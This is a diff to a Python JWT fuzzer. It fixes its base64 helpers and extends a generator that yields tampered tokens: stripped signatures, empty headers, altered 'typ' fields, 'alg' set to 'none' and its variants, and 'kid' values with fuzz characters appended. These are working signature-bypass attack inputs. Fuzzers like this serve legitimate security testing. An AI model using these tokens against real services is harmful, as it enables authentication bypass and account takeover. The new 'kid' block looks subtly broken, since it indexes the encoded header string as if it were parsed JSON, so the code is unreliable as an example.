@@ -12,6 +12,7 @@
 #
 # Author: Alexandre Hamelin <alexandre.hamelin gmail.com>
 
+import string
 import base64
 import json
 from array import array
@@ -101,10 +102,10 @@ def ub64d(enc):
     padding = len(enc) % 4
     if padding > 0:
         enc += '=' * (4 - padding)
-    return urlsafe_b64decode(enc)
+    return base64.urlsafe_b64decode(enc)
 
 def ub64e(dec):
-    return urlsafe_b64encode(dec).strip('=')
+    return base64.urlsafe_b64encode(dec).strip('=')
 
 def valid_jwt(jwt, verify_sig=False, verify_claims=False):
     try:
@@ -115,16 +116,18 @@ def valid_jwt(jwt, verify_sig=False, verify_claims=False):
         
         json.loads(hdr)
         json.loads(payload)
+        return True
     except (IndexError, TypeError, ValueError):
         return False
 
 def create_jwt_generator(jwt):
     if not valid_jwt(jwt):
+        yield jwt
         return
 
     EMPTY_PART = 'e30' # encoded '{}'
     hdr, payload, sig = jwt.split('.')
-    yield hdr + '.' + payload
+    yield hdr + '.' + payload + '.'
     yield jwt + '.'
     yield 'e30.' + payload + '.' + sig
     yield hdr + '.e30.' + sig
@@ -134,20 +137,23 @@ def create_jwt_generator(jwt):
     fake_hdr = json.loads(ub64d(hdr))
 
     def mkjwt():
-        ub64e(json.dumps(fake_hdr)) + '.' + payload + sig
+        return ub64e(json.dumps(fake_hdr)) + '.' + payload + '.' + sig
 
     fake_hdr['typ'] = fake_hdr['typ'].swapcase(); yield mkjwt()
     fake_hdr['typ'] = 'xxx'; yield mkjwt()
     fake_hdr['typ'] = []; yield mkjwt()
     fake_hdr['typ'] = []; yield mkjwt()
     fake_hdr['typ'] = False; yield mkjwt()
-    for c in fuzz_chars:
-        fake_hdr['typ'] = 'JWT' + c; yield mkjwt()
     fake_hdr['typ'] = 'JWT'
 
     for alg in ('none', 'None', 'NONE', 'NUL', 'NULL', 'Null', 'null', ''):
         fake_hdr['alg'] = alg; yield mkjwt()
-    
+
     fake_hdr['alg'] = None; yield mkjwt()
     del fake_hdr['alg']; yield mkjwt()
-    del fake_hdr['typ']
+    del fake_hdr['typ']; yield mkjwt()
+
+    fake_hdr = json.loads(ub64d(hdr)) # reinit
+    if 'kid' in hdr:
+        for c in fuzz_chars:
+            fake_hdr['kid'] = hdr['kid'] + c; yield mkjwt()
